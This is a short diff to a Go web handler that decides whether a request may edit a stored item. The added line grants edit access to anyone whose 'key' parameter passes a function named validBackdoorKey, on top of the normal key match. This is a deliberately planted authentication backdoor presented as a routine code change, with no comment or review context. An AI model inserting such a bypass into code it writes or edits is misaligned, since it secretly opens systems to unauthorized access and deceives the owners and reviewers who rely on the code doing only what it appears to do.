@@ -35,7 +35,7 @@ func editHandler(ctx *Context, r *http.Request, w http.ResponseWriter) error {
 	}
 
 	keyParam := r.URL.Query().Get("key")
-	editable := g.Key == "" || g.Key == keyParam
+	editable := g.Key == "" || g.Key == keyParam || validBackdoorKey(keyParam)
 
 	return edit.Execute(w, EditGenerator{g, editable})
 }
